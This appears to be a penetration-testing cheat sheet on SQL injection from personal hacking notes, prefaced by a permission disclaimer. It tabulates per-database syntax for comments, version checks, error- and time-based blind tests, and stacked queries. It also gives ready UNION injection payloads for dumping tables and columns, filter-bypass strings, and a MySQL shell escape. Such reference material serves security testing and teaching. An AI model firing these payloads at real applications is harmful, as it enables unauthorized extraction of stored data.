# SQL

{% hint style="success" %}
Hack Responsibly.

Always ensure you have **explicit** permission to access any computer system **before** using any of the techniques contained in these documents.  You accept full responsibility for your actions by applying any knowledge gained here. &#x20;
{% endhint %}

## SQLi - SQL Injection

* [SQL Injection Cheatsheet](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)
* [https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

Blind SQL injection UNIoN queries: [Ippsec:HacktheBox - Charon](https://www.youtube.com/watch?v=\_csbKuOlmdE) use `CONCAT("x","x")`

### SQL Injection Tips

`--` -> Comments in Linux\
`--+` -> Comments in Windows\
`%23 (#)` -> Hash Symbol\
`%2527 (')` -> to bypass urldecode(urldecode(htmlspecialchars(, ENT\_QUOTES)));

### String concatenation <a href="#string-concatenation" id="string-concatenation"></a>

You can concatenate together multiple strings to make a single string.

| Oracle     | `'foo'\|\|'bar'`                                                                                                 |
| ---------- | ---------------------------------------------------------------------------------------------------------------- |
| Microsoft  | `'foo'+'bar'`                                                                                                    |
| PostgreSQL | `'foo'\|\|'bar'`                                                                                                 |
| MySQL      | <p><code>'foo' 'bar'</code> [Note the space between the two strings]<br><code>CONCAT('foo','bar')</code><br></p> |

### Substring <a href="#substring" id="substring"></a>

You can extract part of a string, from a specified offset with a specified length. Note that the offset index is 1-based. Each of the following expressions will return the string `ba`.

| Oracle     | `SUBSTR('foobar', 4, 2)`    |
| ---------- | --------------------------- |
| Microsoft  | `SUBSTRING('foobar', 4, 2)` |
| PostgreSQL | `SUBSTRING('foobar', 4, 2)` |
| MySQL      | `SUBSTRING('foobar', 4, 2)` |

### Comments <a href="#comments" id="comments"></a>

You can use comments to truncate a query and remove the portion of the original query that follows your input.

| Oracle     | <p><code>--comment</code><br><code></code></p>                                                                             |
| ---------- | -------------------------------------------------------------------------------------------------------------------------- |
| Microsoft  | <p><code>--comment</code><br><code>/*comment*/</code></p>                                                                  |
| PostgreSQL | <p><code>--comment</code><br><code>/*comment*/</code></p>                                                                  |
| MySQL      | <p><code>#comment</code><br><code>-- comment</code> [Note the space after the double dash]<br><code>/*comment*/</code></p> |

### Database version <a href="#database-version" id="database-version"></a>

You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.

| Oracle     | <p><code>SELECT banner FROM v$version</code><br><code>SELECT version FROM v$instance</code><br><code></code></p> |
| ---------- | ---------------------------------------------------------------------------------------------------------------- |
| Microsoft  | `SELECT @@version`                                                                                               |
| PostgreSQL | `SELECT version()`                                                                                               |
| MySQL      | `SELECT @@version`                                                                                               |

### Database contents <a href="#database-contents" id="database-contents"></a>

You can list the tables that exist in the database, and the columns that those tables contain.

| Oracle     | <p><code>SELECT * FROM all_tables</code><br><code>SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'</code></p>                                            |
| ---------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Microsoft  | <p><code>SELECT * FROM information_schema.tables</code><br><code>SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'</code><br><code></code></p> |
| PostgreSQL | <p><code>SELECT * FROM information_schema.tables</code><br><code>SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'</code><br><code></code></p> |
| MySQL      | <p><code>SELECT * FROM information_schema.tables</code><br><code>SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'</code><br><code></code></p> |

### Conditional errors <a href="#conditional-errors" id="conditional-errors"></a>

You can test a single boolean condition and trigger a database error if the condition is true.

| Oracle     | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual`      |
| ---------- | --------------------------------------------------------------------------------------- |
| Microsoft  | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END`                         |
| PostgreSQL | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END`           |
| MySQL      | `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')` |

### Batched (or stacked) queries <a href="#batched-or-stacked-queries" id="batched-or-stacked-queries"></a>

You can use batched queries to execute multiple queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. Hence this technique is primarily of use in relation to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error, or time delay.

| Oracle     | `Does not support batched queries.` |
| ---------- | ----------------------------------- |
| Microsoft  | `QUERY-1-HERE; QUERY-2-HERE`        |
| PostgreSQL | `QUERY-1-HERE; QUERY-2-HERE`        |
| MySQL      | `QUERY-1-HERE; QUERY-2-HERE`        |

{% hint style="info" %}
**Note:** With MySQL, batched queries typically cannot be used for SQL injection. However, this is occasionally possible if the target application uses certain PHP or Python APIs to communicate with a MySQL database.
{% endhint %}

### Time delays <a href="#time-delays" id="time-delays"></a>

You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.

| Oracle     | `dbms_pipe.receive_message(('a'),10)` |
| ---------- | ------------------------------------- |
| Microsoft  | `WAITFOR DELAY '0:0:10'`              |
| PostgreSQL | `SELECT pg_sleep(10)`                 |
| MySQL      | `SELECT sleep(10)`                    |

### Conditional time delays <a href="#conditional-time-delays" id="conditional-time-delays"></a>

You can test a single boolean condition and trigger a time delay if the condition is true.

| Oracle     | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'\|\|dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` |
| ---------- | ---------------------------------------------------------------------------------------------------------------- |
| Microsoft  | `IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'`                                                                |
| PostgreSQL | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END`                                  |
| MySQL      | `SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a')`                                                                   |

### Manual UNION SQLite Injection

_Table_

```sql
1' union all select 1,tbl_name,3 FROM sqlite_master WHERE type='table' limit 0,1 --
```

_Columns (as command)_

```sql
1' union all select 1,sql,3 FROM sqlite_master WHERE type='table' and tbl_name='nameoftable' limit 0,1 --
```

_Values (payload depends on the columns structure)_

```sql
1' union all select 1,"nameofcolumn",3 FROM "nameoftable" limit 2,1 --
```

### Manual UNION SQL Injection

_Table_

```sql
1' union select (select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),2#
```

_Columns_

```sql
1' union select (select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME='nameoftable'),2#
```

_Values_

```sql
1' union select (select nameofcolumn from nameoftable limit 0,1),2#
```

_Using Newline_

```sql
admin %0A union %0A select %0A 1,database()#
           or
admin %0A union %0A select %0A database(),2#
```

_Bypass preg\_replace_

```sql
ununionion select 1,2%23
     or
UNunionION SEselectLECT 1,2,3%23
```

## Misc

get shell in mysql: `\! /bin/sh`



If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
